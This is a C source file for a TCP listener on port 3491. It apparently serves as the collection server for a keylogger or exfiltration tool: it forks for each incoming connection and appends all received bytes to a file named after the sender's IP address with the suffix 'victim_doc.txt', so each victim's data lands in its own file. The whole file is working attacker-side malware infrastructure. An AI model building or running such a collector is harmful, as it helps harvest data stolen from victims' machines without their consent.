#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <netdb.h>
#include <string.h>
#include <sys/wait.h>

#define PORT "3491"
#define BACKLOG 10 // How many pending connections queue will hold
#define BUFFER_SIZE 1000

int stop = 1;
void sigint_handler(int sig) 
{
	stop = 0;
    printf("Caught signal %d\n", sig); 
}

void sigchld_handler(int sig){
	while(waitpid(-1, NULL, WNOHANG) > 0);
}

/*
*setup_addrinfo will place for us the relevant value (Among other things,
*it will include the criteria for selecting the socket address) to 'addrinfo'
*struct value (e.g. servinfo)
*/
void setup_addrinfo(struct addrinfo **servinfo, char *hostname, char *port, int flag)
{
	struct addrinfo hints;
	int rv;

	memset(&hints, 0, sizeof(hints)); // Zero the whole structure before use with memset()
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = flag;

	if((rv = getaddrinfo(hostname, port, &hints, servinfo)) != 0) // Allocates and initializes servinfo
	{
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
		freeaddrinfo(*servinfo);
		exit(1);
	}
}

int get_listener_socket_file_descriptor(char *port)
{
	struct addrinfo *servinfo, *p;
	int sockfd;
	char s[INET_ADDRSTRLEN];
	int yes = 1;

	setup_addrinfo(&servinfo, NULL, port, AI_PASSIVE);

	//Bind to the first possible result
	for(p = servinfo; p != NULL; p = p->ai_next)
	{
		if((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1)
		{
			perror("socket");
			continue;
		}

		if(bind(sockfd, p->ai_addr, p->ai_addrlen) == -1)
		{
			close(sockfd);
			perror("connection");
			continue;
		}

		break;
	}

	if(p == NULL)
	{
		fprintf(stderr, "%s\n", "server: failed to bind ");
		exit(1);
	}

	inet_ntop(p->ai_family, &(((struct sockaddr_in *)p->ai_addr)->sin_addr), s, sizeof(s));
	printf("listening on %s\n", s);

	freeaddrinfo(servinfo);

	return sockfd;
}

int main(int argc, char *argv[])
{
	int sockfd, new_fd;
	struct sigaction sa;
	struct sockaddr_storage their_addr; // Address information of client
	socklen_t sin_size;
	char s[INET_ADDRSTRLEN + 18];
	char victim_doc[18] = " - victim_doc.txt";
	char buffer[BUFFER_SIZE];
	ssize_t bytes_recieved;
	int i;
	FILE *fp;

	sockfd = get_listener_socket_file_descriptor(PORT);

	if(listen(sockfd, BACKLOG) == -1)
	{
		perror("listen");
		exit(1);
	}

	// Reap all dead processes.
	sa.sa_handler = sigchld_handler;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = SA_RESTART;
	if(sigaction(SIGCHLD, &sa, NULL) == -1)
	{
		perror("sigaction");
		exit(1);
	}

	printf("server waiting for connections\n");

	while(stop)
	{
		sin_size = sizeof(their_addr);
		new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size);
		if (new_fd == -1)
		{
			perror("accept");
			continue;
		}

		inet_ntop(their_addr.ss_family, &(((struct sockaddr_in *)&their_addr)->sin_addr), s, sizeof(s));
		printf("Server: got connection from %s\n", s);

		strcat(s, victim_doc); // Make the file name unique - victim ip address

		if((fp = fopen(s,"a")) == NULL)
			perror("opening file failed");

		if(!fork()) // this is the child process
		{
			close(sockfd); // child doesn't need the listener

			bytes_recieved = recv(new_fd, buffer, sizeof(buffer), 0);

			if(bytes_recieved < 0)
			{
				perror("recv");
				exit(1);
			}

			while(bytes_recieved > 0)
			{
				for(i = 0; i < bytes_recieved; ++i)
				{
					fprintf(fp, "%c", buffer[i]);
					printf("%c\n", buffer[i]);
				}

				bytes_recieved = recv(new_fd, buffer, sizeof(buffer), 0);
			}
			fflush(fp);
			close(new_fd);
			exit(0);
		}
	}
	
	close(new_fd);
	fclose(fp);
	return 0;
}